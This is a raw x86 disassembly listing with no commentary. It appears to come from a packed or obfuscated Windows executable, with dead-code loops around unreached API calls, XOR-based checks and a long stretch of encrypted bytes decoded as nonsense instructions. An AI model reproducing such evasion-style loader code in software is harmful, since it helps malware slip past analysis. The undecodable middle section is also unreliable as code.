  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	call   0x7f724953
  4176bf:	sub    eax,0x7e05787f
  4176c4:	js     0x41773e
  4176c6:	mov    DWORD PTR [ebp+eiz*4-0x4a],edx
  4176ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176cb:	xor    ebp,DWORD PTR [edi+0x7a]
  4176ce:	add    BYTE PTR [esi],al
  4176d0:	and    al,ch
  4176d2:	xchg   ebx,eax
  4176d3:	je     0x417684
  4176d5:	out    0xdf,eax
  4176d7:	add    BYTE PTR [eax],bl
  4176d9:	enter  0xc8c2,0x43
  4176dd:	adc    edx,DWORD PTR ds:0xcf26f32b
  4176e3:	xchg   ebx,eax
  4176e4:	cdq    
  4176e5:	push   es
  4176e6:	retf   
  4176e7:	push   esp
  4176e8:	mov    bl,BYTE PTR [edx-0x7e]
  4176eb:	(bad)  
  4176ed:	jnp    0x417679
  4176ef:	rcr    BYTE PTR [ebx+esi*8+0x2c2caa3f],1
  4176f6:	hlt    
  4176f7:	repz jnp 0x4176d2
  4176fa:	into   
  4176fb:	scas   eax,DWORD PTR es:[edi]
  4176fc:	out    0x29,eax
  4176fe:	jb     0x417713
  417700:	retf   
  417701:	(bad)
  417704:	loop   0x41771b
  417706:	and    eax,DWORD PTR [ecx-0x1c]
  417709:	retf   0x800e
  41770c:	fcmovu st,st(6)
  41770e:	mov    BYTE PTR [ecx],dh
  417710:	daa    
  417711:	pop    es
  417712:	jb     0x41777d
  417714:	sbb    eax,0x159633e6
  417719:	or     ch,ah
  41771b:	mov    ebp,0x1c3c3a14
  417720:	inc    esi
  417721:	icebp  
  417722:	pop    esi
  417723:	inc    edi
  417724:	xlat   BYTE PTR ds:[ebx]
  417725:	mov    WORD PTR [ebp+0x4dffd336],?
  41772b:	mov    esi,DWORD PTR ds:0x8455f6db
  417731:	inc    edx
  417732:	pop    ss
  417733:	jmp    0x41775f
  417735:	into   
  417736:	xchg   edx,eax
  417737:	pop    eax
  417738:	xor    al,BYTE PTR ds:0xe47499cb
  41773e:	pop    ebx
  41773f:	leave  
  417740:	fwait
  417741:	enter  0xe0ea,0x6
  417745:	rcl    BYTE PTR [edx],1
  417747:	xchg   edx,edi
  417749:	push   ss
  41774a:	mov    ebp,0x4d53d761
  41774f:	retf   
  417750:	ins    BYTE PTR es:[edi],dx
  417751:	outs   dx,BYTE PTR es:[esi]
  417753:	push   es
  417754:	sub    DWORD PTR ds:0x8b9d0bb0,ebx
  41775a:	into   
  41775b:	rcr    DWORD PTR [ebx],1
  41775d:	retf   0xa435
  417760:	cmp    DWORD PTR [ecx],esp
  417762:	in     eax,dx
  417763:	retf   0xc533
  417766:	popf   
  417767:	pop    ds
  417768:	repz jno 0x4176fa
  41776b:	sbb    BYTE PTR [eax+eax*8+0x37a6a55c],bh
  417772:	jmp    0x417704
  417774:	icebp  
  417775:	mov    ebx,es
  417777:	out    dx,al
  417778:	adc    BYTE PTR [ecx],ch
  41777a:	mov    bl,0xb6
  41777c:	dec    ebp
  41777d:	dec    edi
  41777e:	fidivr DWORD PTR [eax-0x1c]
  417782:	std    
  417783:	clc    
  417784:	fist   WORD PTR [ebx+0x54]
  417787:	mov    cl,0xc6
  417789:	pop    ecx
  41778a:	adc    ebp,DWORD PTR [ecx-0x7fa048ab]
  417790:	inc    esi
  417791:	inc    eax
  417792:	scas   al,BYTE PTR es:[edi]
  417793:	test   DWORD PTR [esi+0x20da7d40],0xcb37c1c3
  41779d:	fisttp QWORD PTR [ebp+0x77]
  4177a0:	xchg   BYTE PTR [esi-0x75],dl
  4177a3:	pop    eax
  4177a4:	clc    
  4177a5:	push   eax
  4177a6:	xlat   BYTE PTR ds:[ebx]
  4177a7:	and    DWORD PTR [esi],ebx
  4177a9:	sahf   
  4177aa:	sub    ecx,DWORD PTR [esi+0x5e40da57]
  4177b0:	sbb    al,0xf4
  4177b2:	ins    DWORD PTR es:[edi],dx
  4177b3:	jnp    0x41776d
  4177b5:	adc    ecx,ecx
  4177b7:	cmp    al,0x1
  4177b9:	shl    DWORD PTR [edi+0xa3af83f],cl
  4177bf:	xchg   ebx,eax
  4177c0:	mov    al,0x5b
  4177c2:	adc    al,0xa1
  4177c4:	test   al,0x79
  4177c6:	sti    
  4177c7:	call   0x3aa3:0xf2979681
  4177ce:	rol    DWORD PTR [edi+0x7894e0b9],1
  4177d4:	inc    esp
  4177d5:	aaa    
  4177d6:	mov    edx,0x3e0c83f7
  4177db:	xchg   edx,eax
  4177dc:	bnd jle 0x4177a7
  4177df:	jno    0x417843
  4177e1:	push   ecx
  4177e2:	outs   dx,DWORD PTR ds:[esi]
  4177e3:	mov    dl,0x75
  4177e5:	xor    BYTE PTR [edx],ch
  4177e7:	pop    ecx
  4177e8:	clc    
  4177e9:	and    DWORD PTR [ecx],esi
  4177eb:	sbb    BYTE PTR [edi],0x0
  4177ee:	push   edx
  4177ef:	inc    esp
  4177f0:	sbb    DWORD PTR [esi+0x69],ebp
  4177f3:	xchg   esp,eax
  4177f4:	mov    dh,BYTE PTR [edx]
  4177f6:	push   esp
  4177f7:	sahf   
  4177f8:	je     0x417808
  4177fa:	xlat   BYTE PTR ds:[ebx]
  4177fb:	pushf  
  4177fc:	repz mov ah,0x42
  4177ff:	fldcw  WORD PTR [ebx+ebp*1]
  417802:	sub    eax,0xdbb31d62
  417807:	frstor [eax+ebp*4]
  41780a:	cmp    dl,0x1e
  41780d:	sub    bl,al
  41780f:	aad    0x5c
  417811:	jmp    0xe25:0x9719899b
  417818:	adc    al,0xb9
  41781a:	shr    DWORD PTR [edx-0x5],0x35
  41781e:	pop    es
  41781f:	and    BYTE PTR [ebx+0x5c],al
  417822:	sbb    ebx,ecx
  417824:	pop    esi
  417825:	test   BYTE PTR [ecx],dh
  417827:	inc    edx
  417828:	inc    esp
  417829:	out    0xb4,al
  41782b:	adc    eax,0x737a327e
  417830:	jl     0x417835
  417832:	leave  
  417833:	xor    al,0xda
  417835:	jnp    0x4178a8
  417837:	push   0x4aabd2b1
  41783c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41783d:	pop    edi
  41783e:	loope  0x4177ec
  417840:	rcr    DWORD PTR [edx+0x79],0x8d
  417844:	jp     0x4177c7
  417846:	xchg   ebp,eax
  417847:	cdq    
  417848:	xchg   edi,eax
  417849:	ins    BYTE PTR es:[edi],dx
  41784a:	mov    ecx,0x4b10e470
  41784f:	mov    bl,0x90
  417851:	xor    al,0x70
  417853:	jge    0x4178a0
  417855:	jae    0x417869
  417857:	dec    ecx
  417858:	ins    DWORD PTR es:[edi],dx
  417859:	enter  0xf1b8,0x5c
  41785d:	ins    DWORD PTR es:[edi],dx
  41785e:	ins    BYTE PTR es:[edi],dx
  41785f:	icebp  
  417860:	and    dh,BYTE PTR [edi-0x3c87daca]
  417866:	inc    edx
  417867:	lods   al,BYTE PTR ds:[esi]
  417868:	sbb    BYTE PTR [ebx],al
  41786a:	mov    ecx,0xcdf2663c
  41786f:	out    0xa9,al
  417871:	adc    bl,bh
  417873:	jmp    0x9508:0x285a1d6c
  41787a:	add    cl,bl
  41787c:	in     eax,dx
  41787d:	and    cl,BYTE PTR [edx-0x70]
  417880:	mov    DWORD PTR [eax-0x2e],edx
  417883:	(bad)  
  417884:	xor    dl,BYTE PTR [eax-0x5f]
  417887:	push   cs
  417888:	lods   al,BYTE PTR ds:[esi]
  417889:	dec    edx
  41788a:	js     0x4178f5
  41788c:	pop    edi
  41788d:	aaa    
  41788e:	mov    bh,0x30
  417890:	mov    dh,0x30
  417892:	inc    esi
  417893:	jmp    0x4178c2
  417895:	xchg   ebx,eax
  417896:	hlt    
  417897:	retf   
  417898:	pop    eax
  417899:	shl    DWORD PTR [esi-0x4],0x6e
  41789d:	cmp    ecx,DWORD PTR [esi+0x21006854]
  4178a3:	mov    dl,0x24
  4178a5:	imul   esi,DWORD PTR [ebp-0x1b970df6],0xae539f46
  4178af:	jbe    0x41783b
  4178b1:	sub    bl,BYTE PTR es:[esi]
  4178b4:	mov    ds:0x8e98c10d,al
  4178b9:	repz jnp 0x4178f7
  4178bc:	lods   al,BYTE PTR ds:[esi]
  4178bd:	mov    ebx,0x3631dc1c
  4178c2:	ss imul ebp,edx,0xffffffdd
  4178c6:	imul   edx,DWORD PTR [eax+0xf7c484d],0x47
  4178cd:	iret   
  4178ce:	xchg   ebp,eax
  4178cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d0:	and    BYTE PTR [ebx],al
  4178d2:	dec    eax
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	fs jbe 0x4178cd
  4178e8:	out    dx,al
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0x4778787e
  4178f2:	xchg   edi,eax
  4178f3:	out    0x39,al
  4178f5:	loop   0x4178d4
  4178f7:	rcr    cl,1
  4178f9:	mov    ch,0xa5
  4178fb:	scas   al,BYTE PTR es:[edi]
  4178fc:	mov    ds:0x913ba25,eax
  417901:	int    0xc6
  417903:	int    0xe9
  417905:	mov    ah,BYTE PTR [eax+0x14]
  417908:	add    ax,0x83fc
  41790c:	cmp    edi,0x863c7d77
  417912:	push   edi
  417913:	fwait
  417914:	ds jo  0x417924
  417917:	pop    ebp
  417918:	stos   BYTE PTR es:[edi],al
  417919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41791a:	mov    edi,0x42520fd2
  41791f:	xchg   edi,eax
  417920:	jnp    0x4178f2
  417922:	push   eax
  417923:	mov    esi,0xa292614f
  417928:	cmp    al,0x57
  41792a:	lea    ecx,[edx]
  41792c:	jae    0x417930
  41792e:	mov    bh,0x31
  417930:	or     dh,dl
  417932:	mov    DWORD PTR [eax+0x29],0x4c94aabd
  417939:	add    edx,DWORD PTR [esi-0x1af4d728]
  41793f:	std    
  417940:	lock jmp 0x417911
  417943:	cwde   
  417944:	shl    BYTE PTR [ecx],cl
  417946:	inc    edi
  417947:	in     al,dx
  417948:	and    al,0x5c
  41794a:	mov    esi,0x26a05234
  41794f:	jb     0x4179ab
  417951:	push   ebp
  417952:	mov    dh,0xe3
  417954:	pop    esi
  417955:	fiadd  DWORD PTR [esi-0x6c]
  417958:	sub    cl,bh
  41795a:	ins    BYTE PTR es:[edi],dx
  41795b:	and    al,0xe
  41795d:	loope  0x417993
  41795f:	add    al,BYTE PTR [ecx]
  417961:	int3   
  417962:	jecxz  0x4178e7
  417964:	clc    
  417965:	outs   dx,DWORD PTR ds:[esi]
  417966:	sbb    eax,0x1dc0eb26
  41796b:	inc    ebp
  41796c:	xchg   esp,eax
  41796d:	sbb    al,0x93
  41796f:	fild   QWORD PTR [ebp+0x26]
  417972:	jns    0x4179c1
  417974:	inc    esp
  417975:	mov    dl,BYTE PTR [ebp+0x40]
  417978:	xor    BYTE PTR ds:0x186707e9,bl
  41797e:	mov    ebx,0x8589fb41
  417983:	dec    eax
  417984:	fwait
  417985:	ret    0x2726
  417988:	push   esi
  417989:	jnp    0x417a0a
  41798b:	jp     0x417934
  41798d:	jo     0x417956
  41798f:	jnp    0x417960
  417991:	jbe    0x417939
  417993:	push   ds
  417994:	push   esi
  417995:	int3   
  417996:	mov    ah,BYTE PTR [edx-0x61]
  417999:	test   eax,0x677ab3a9
  41799e:	xor    al,0x8a
  4179a0:	sub    eax,0x6a312853
  4179a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179a6:	js     0x417a25
  4179a8:	add    DWORD PTR [esi+eiz*1-0x41],ebp
  4179ac:	pop    es
  4179ad:	jmp    0x4179d1
  4179af:	cli    
  4179b0:	or     BYTE PTR [edi+0x3fe6b12b],ch
  4179b6:	icebp  
  4179b7:	out    0x83,al
  4179b9:	mov    ch,0xd7
  4179bb:	pop    ebx
  4179bc:	add    eax,0x2e7bd010
  4179c1:	xchg   cl,dl
  4179c3:	xlat   BYTE PTR ds:[ebx]
  4179c4:	stos   DWORD PTR es:[edi],eax
  4179c5:	fcomp  QWORD PTR [edi+0x604ef8c7]
  4179cb:	(bad)  
  4179cc:	loop   0x417a43
  4179ce:	int    0xd8
  4179d0:	lahf   
  4179d1:	ds sub ebx,ebp
  4179d4:	or     DWORD PTR [esi+0x5a],ecx
  4179d7:	sbb    dl,0x23
  4179da:	out    dx,al
  4179db:	fstp   DWORD PTR [edx]
  4179dd:	xchg   edi,eax
  4179de:	test   BYTE PTR [ecx+0x6808bb08],bh
  4179e4:	ins    BYTE PTR es:[edi],dx
  4179e5:	xchg   DWORD PTR [esi],ebp
  4179e7:	inc    edx
  4179e8:	pusha  
  4179e9:	jno    0x4179cb
  4179eb:	or     cl,BYTE PTR [ecx+0x72]
  4179ee:	daa    
  4179ef:	inc    ebx
  4179f0:	ss dec ebp
  4179f2:	in     al,dx
  4179f3:	ins    BYTE PTR es:[edi],dx
  4179f4:	xor    al,0x5
  4179f6:	sbb    ecx,edx
  4179f8:	push   edx
  4179f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179fa:	jmp    0x4179b6
  4179fc:	mov    ebp,0xe6ce3686
  417a01:	sti    
  417a02:	fnsetpm(287 only) 
  417a04:	(bad)  
  417a05:	xchg   ecx,eax
  417a06:	jmp    0x10876c31
  417a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a0c:	mov    bh,0x16
  417a0e:	cmp    cl,ah
  417a10:	mov    al,0x59
  417a12:	and    DWORD PTR [ecx+ecx*4],eax
  417a15:	cmp    BYTE PTR [esi],bl
  417a17:	loop   0x417a2f
  417a19:	sub    BYTE PTR [ebp+0x28],bh
  417a1c:	mov    eax,0xc669be47
  417a21:	ds mov edi,ss
  417a24:	popa   
  417a25:	push   esi
  417a26:	std    
  417a27:	push   ss
  417a28:	loop   0x4179e5
  417a2a:	mov    esi,0x81d6a89b
  417a2f:	shl    DWORD PTR [esi],cl
  417a31:	pushf  
  417a32:	sbb    al,0x89
  417a34:	push   0x30
  417a36:	adc    eax,eax
  417a38:	lods   eax,DWORD PTR ds:[esi]
  417a39:	rcr    esi,cl
  417a3b:	ja     0x417a29
  417a3d:	mov    dl,0x78
  417a3f:	fbstp  TBYTE PTR [ebx+0x50]
  417a42:	push   ds
  417a43:	dec    esi
  417a44:	cmp    eax,0x200c91a3
  417a49:	adc    BYTE PTR [edx],0x8e
  417a4c:	mov    fs,WORD PTR [ecx+0x17]
  417a4f:	out    dx,al
  417a50:	fwait
  417a51:	inc    esp
  417a52:	mov    ah,0x9d
  417a54:	mov    bl,0x1b
  417a56:	pop    esp
  417a57:	in     al,dx
  417a58:	sti    
  417a59:	jbe    0x417aa8
  417a5b:	shr    BYTE PTR [edx-0x16],1
  417a5e:	xlat   BYTE PTR ds:[ebx]
  417a5f:	out    0xae,al
  417a61:	dec    eax
  417a62:	mov    ecx,0xc1e80a04
  417a67:	push   eax
  417a68:	nop
  417a69:	mov    esi,0xc786ed65
  417a6e:	inc    ebp
  417a6f:	mov    ds:0x85793eb4,al
  417a74:	mov    ch,0xea
  417a76:	xor    bh,BYTE PTR [esi]
  417a78:	dec    esi
  417a79:	mov    bh,BYTE PTR [eax]
  417a7b:	(bad)  
  417a7c:	or     ecx,ebp
  417a7e:	jle    0x417aba
  417a80:	sub    eax,0x57998551
  417a85:	retf   0x3f53
  417a88:	add    dh,al
  417a8a:	jmp    0x417af0
  417a8c:	adc    dl,BYTE PTR [bp+si]
  417a8f:	dec    ebp
  417a90:	inc    eax
  417a91:	repz test BYTE PTR [ebx],cl
  417a94:	mov    dl,bl
  417a96:	add    al,0xae
  417a98:	cmp    eax,esi
  417a9a:	ret    0x8180
  417a9d:	adc    al,0x8d
  417a9f:	std    
  417aa0:	into   
  417aa1:	mov    esp,0x7dbfdeb7
  417aa6:	add    bh,BYTE PTR [esi+0x469982e3]
  417aac:	mov    ds:0x8b332e9a,al
  417ab1:	retf   0x3769
  417ab4:	xlat   BYTE PTR ds:[ebx]
  417ab5:	fiadd  WORD PTR [ebx]
  417ab7:	jg     0x417ac6
  417ab9:	hlt    
  417aba:	xor    DWORD PTR [edi-0x78ab69f8],edi
  417ac0:	mov    bl,0xa1
  417ac2:	or     BYTE PTR [esi+edi*1-0x60b96905],dl
  417ac9:	loop   0x417aae
  417acb:	jne    0x417b1b
  417acd:	dec    ebp
  417ace:	out    0xde,al
  417ad0:	mov    DWORD PTR [edi+0x69],ebp
  417ad3:	mov    al,ds:0xbeead444
  417ad8:	ret    0x5e6e
  417adb:	aam    0x5
  417add:	les    eax,FWORD PTR [ecx]
  417adf:	sub    eax,0xe329f157
  417ae4:	daa    
  417ae5:	dec    eax
  417ae6:	daa    
  417ae7:	push   ss
  417ae8:	in     al,0xa4
  417aea:	mov    eax,0x7af66ded
  417aef:	jb     0x417b4a
  417af1:	ins    DWORD PTR es:[edi],dx
  417af2:	and    ah,BYTE PTR [edx+0x69c92134]
  417af8:	adc    esi,esp
  417afa:	add    DWORD PTR [ebx+0x510850ba],ecx
  417b00:	pop    es
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xa0e3746c
  417b49:	mov    eax,0x787f3111
  417b4e:	add    eax,0xa378787e
  417b53:	jmp    0x417b7f
  417b55:	mov    bh,0x29
  417b57:	in     eax,0xd4
  417b59:	adc    edi,DWORD PTR [eax]
  417b5b:	jecxz  0x417b50
  417b5d:	fwait
  417b5e:	sub    BYTE PTR [ecx+0x6a22d09f],dh
  417b64:	pusha  
  417b65:	mov    esp,0xff2db7f7
  417b6a:	test   DWORD PTR [edi-0x11],0xac5ad2bf
  417b71:	int    0x78
  417b73:	pop    ds
  417b74:	pop    esp
  417b75:	dec    eax
  417b76:	fcomp  QWORD PTR [ebx-0x32]
  417b79:	cwde   
  417b7a:	rcr    BYTE PTR [esi-0x79515e53],1
  417b80:	inc    ebp
  417b81:	add    eax,0xbfcdf531
  417b86:	mov    ds:0x8c2cc415,eax
  417b8b:	mov    ch,0xc4
  417b8d:	jge    0x417b84
  417b8f:	dec    ebp
  417b90:	imul   edx,DWORD PTR ds:0xa41f29fc,0xef464ae1
  417b9a:	sbb    bl,ah
  417b9c:	lea    esp,[edx+0x3888ae36]
  417ba2:	sbb    DWORD PTR [ecx],ebx
  417ba4:	xor    DWORD PTR [edi+ebx*1+0x84dd4e2],esi
  417bab:	ror    BYTE PTR [ebx+0x2c],1
  417bae:	shr    DWORD PTR [edi],cl
  417bb0:	(bad)  [ebx+edi*8]
  417bb3:	stc    
  417bb4:	jmp    0x417b3d
  417bb6:	pop    edx
  417bb7:	lock inc eax
  417bb9:	mov    eax,ds:0xa825a388
  417bbe:	pusha  
  417bbf:	pop    ds
  417bc0:	cli    
  417bc1:	fst    QWORD PTR [ebx+ebp*2-0x1d]
  417bc5:	leave  
  417bc6:	out    0x33,al
  417bc8:	pop    edi
  417bc9:	adc    DWORD PTR [esi-0x7e6d685f],eax
  417bcf:	jno    0x417b84
  417bd1:	xor    DWORD PTR [eax-0x49],0xffffffa5
  417bd5:	mov    ds:0xe0a151cf,al
  417bda:	sbb    ebx,0xffffffe3
  417bdd:	scas   al,BYTE PTR es:[edi]
  417bde:	and    ebx,DWORD PTR [eax+0x28]
  417be1:	loop   0x417b73
  417be3:	add    ebp,ecx
  417be5:	shl    DWORD PTR [ebx+0x6c],cl
  417be8:	inc    ebx
  417be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bea:	or     eax,0xd0811264
  417bef:	je     0x417beb
  417bf1:	scas   al,BYTE PTR es:[edi]
  417bf2:	es (bad) 
  417bf4:	sub    BYTE PTR [edx],al
  417bf6:	icebp  
  417bf7:	sub    DWORD PTR [eax-0x4fa3fbec],eax
  417bfd:	je     0x417c35
  417bff:	and    cl,BYTE PTR [esp+ecx*1+0x40]
  417c03:	xchg   DWORD PTR [edx],esp
  417c05:	adc    DWORD PTR [edx-0x4f55cde5],edi
  417c0b:	test   al,0x27
  417c0d:	into   
  417c0e:	cmc    
  417c0f:	dec    esi
  417c10:	stc    
  417c11:	dec    edx
  417c12:	xchg   ebp,eax
  417c13:	adc    eax,0x81733f24
  417c18:	int3   
  417c19:	sbb    eax,0x6c1758d2
  417c1e:	sbb    al,0x22
  417c20:	ja     0x417c57
  417c22:	clc    
  417c23:	and    eax,0x447bea54
  417c28:	shr    BYTE PTR [edi],1
  417c2a:	fbld   TBYTE PTR [ebx]
  417c2c:	inc    esp
  417c2d:	jge    0x417c45
  417c2f:	and    al,0xb4
  417c31:	shl    BYTE PTR [edi+0x67449483],1
  417c37:	and    edi,DWORD PTR [edi-0x679f5453]
  417c3d:	lods   al,BYTE PTR ds:[esi]
  417c3e:	ret    
  417c3f:	cmp    dl,bl
  417c41:	es (bad) 
  417c43:	sub    ebp,DWORD PTR ds:0xcdf0ce83
  417c49:	ds movhlps xmm1,xmm3
  417c4d:	lahf   
  417c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4f:	mov    esi,?
  417c51:	rcl    BYTE PTR [ecx+0x2e],cl
  417c54:	lock inc ecx
  417c56:	out    dx,al
  417c57:	ficom  DWORD PTR [ebx+0x34]
  417c5a:	jecxz  0x417bea
  417c5c:	scas   eax,DWORD PTR es:[edi]
  417c5d:	push   ds
  417c5e:	ret    
  417c5f:	dec    eax
  417c60:	outs   dx,BYTE PTR ds:[esi]
  417c61:	xlat   BYTE PTR ds:[ebx]
  417c62:	retf   
  417c63:	ins    BYTE PTR es:[edi],dx
  417c64:	adc    esi,edx
  417c66:	ds xchg ecx,eax
  417c68:	je     0x417c27
  417c6a:	mov    al,0x25
  417c6c:	mov    eax,0x419352f6
  417c71:	cmp    eax,0xb42ccec
  417c76:	test   al,0x9a
  417c78:	push   eax
  417c79:	pop    edx
  417c7a:	add    eax,0x79819a80
  417c7f:	mov    ecx,0xf9bcb3b8
  417c84:	mov    ebx,0xbfcc68b4
  417c89:	xchg   ebx,eax
  417c8a:	icebp  
  417c8b:	daa    
  417c8c:	adc    edi,DWORD PTR [edx-0x74]
  417c8f:	sbb    eax,0x877bb4f7
  417c94:	inc    ebx
  417c95:	jg     0x417d01
  417c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c98:	repz dec ebx
  417c9a:	and    bh,dh
  417c9c:	ins    BYTE PTR es:[di],dx
  417c9e:	(bad)  
  417c9f:	retf   
  417ca0:	aas    
  417ca1:	outs   dx,DWORD PTR ds:[esi]
  417ca2:	popf   
  417ca3:	cmp    al,0xbb
  417ca5:	xchg   ecx,eax
  417ca6:	inc    ebx
  417ca7:	ds loope 0x417d1d
  417caa:	addr16 ret 
  417cac:	mov    dl,0xf9
  417cae:	addr16 aad 0x4
  417cb1:	mov    ah,0x68
  417cb3:	push   edx
  417cb4:	ds jp  0x417c53
  417cb7:	or     ch,ch
  417cb9:	pop    edi
  417cba:	xchg   esi,eax
  417cbb:	cmp    ch,cl
  417cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cbe:	mov    ecx,0x3dc1e14a
  417cc3:	das    
  417cc4:	mov    edx,0x7375948a
  417cc9:	dec    edi
  417cca:	nop
  417ccb:	or     al,0x12
  417ccd:	rcl    DWORD PTR ss:[edx],1
  417cd0:	gs jmp 0x8dfa:0xad51711b
  417cd8:	jno    0x417ca1
  417cda:	jl     0x417c6c
  417cdc:	outs   dx,BYTE PTR ds:[esi]
  417cdd:	sub    al,0xfc
  417cdf:	cdq    
  417ce0:	inc    esp
  417ce1:	rcl    BYTE PTR [ecx-0x2f],0x20
  417ce5:	repz push ds
  417ce7:	in     al,dx
  417ce8:	xchg   DWORD PTR [edi+edx*2-0x31],ecx
  417cec:	push   ebp
  417ced:	and    BYTE PTR [esi],bl
  417cef:	xchg   ebx,eax
  417cf0:	clc    
  417cf1:	pop    edi
  417cf2:	or     dl,BYTE PTR [eax]
  417cf4:	cmp    edi,DWORD PTR [esi-0x71]
  417cf7:	fsub   QWORD PTR [ecx+edx*8+0x31]
  417cfb:	out    0x36,al
  417cfd:	outs   dx,BYTE PTR ds:[esi]
  417cfe:	fisttp QWORD PTR [ebp+0x6ac9412b]
  417d04:	rcr    BYTE PTR [edi-0x1a8faa0a],cl
  417d0a:	inc    ebp
  417d0b:	out    dx,eax
  417d0c:	adc    BYTE PTR [ebp*8+0x118b4cd9],al
  417d13:	jne    0x417ca7
  417d15:	xchg   edx,eax
  417d16:	pop    edi
  417d17:	xchg   ebx,eax
  417d18:	lds    ebp,FWORD PTR [eax-0x4f]
  417d1b:	mov    ah,0x84
  417d1d:	mov    dh,0x46
  417d1f:	retf   
  417d20:	gs xor esp,ebp
  417d23:	(bad)  
  417d24:	push   cs
  417d25:	mov    fs,ecx
  417d27:	shl    DWORD PTR [ecx+0x7245a895],cl
  417d2d:	mov    al,0x82
  417d2f:	lods   al,BYTE PTR ds:[esi]
  417d30:	sub    esp,ebp
  417d32:	ret    0xf1f8
  417d35:	test   eax,0x7039af44
  417d3a:	and    eax,0x7fc2643d
  417d3f:	cli    
  417d40:	sub    BYTE PTR [esi],al
  417d42:	mov    esp,0x14743569
  417d47:	imul   edi,eax,0x59
  417d4a:	pop    ss
  417d4b:	and    DWORD PTR [ebx-0x21df869f],esi
  417d51:	add    DWORD PTR [eax+0x11],0x68
  417d55:	jb     0x417d88
  417d57:	mov    bh,0x63
  417d59:	frstor [ebp-0x37]
  417d5c:	mov    ?,WORD PTR ds:0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
